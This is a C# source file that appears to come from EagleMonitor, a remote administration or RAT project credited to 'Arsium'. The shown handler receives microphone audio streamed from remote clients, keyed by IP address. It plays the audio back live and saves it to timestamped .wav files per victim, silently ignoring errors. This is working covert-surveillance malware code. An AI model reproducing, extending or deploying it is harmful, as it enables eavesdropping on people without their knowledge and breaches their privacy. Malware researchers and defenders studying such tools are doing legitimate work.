using EagleMonitor.Networking;
using NAudio.Wave;
using PacketLib.Packet;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class RemoteAudioCapturePacketHandler
    {
        public RemoteAudioCapturePacketHandler(RemoteAudioCapturePacket remoteAudioCapturePacket, ClientHandler clientHandler)
        {
            try
            {
               
                if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].remoteAudioForm.hasAlreadyConnected == false)
                {
                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].audioHelper.currentFileName = ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientPath + "\\Audio Records\\" + Utils.Miscellaneous.DateFormater() + ".wav";
                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].audioHelper.currentOffset = 0;
                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].audioHelper.waveFileWriter = new WaveFileWriter(ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].audioHelper.currentFileName, new WaveFormat(44100, 1));
                }
                //currentOffset
                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].remoteAudioForm.hasAlreadyConnected = true;

                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].audioHelper.bufferedWaveProvider.AddSamples(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);

                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].audioHelper.waveFileWriter.Write(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);

                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].audioHelper.waveFileWriter.Flush();

                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].audioHelper.currentOffset += remoteAudioCapturePacket.bytesRecorded;

                return;
            }
            catch { }
        }
    }
}
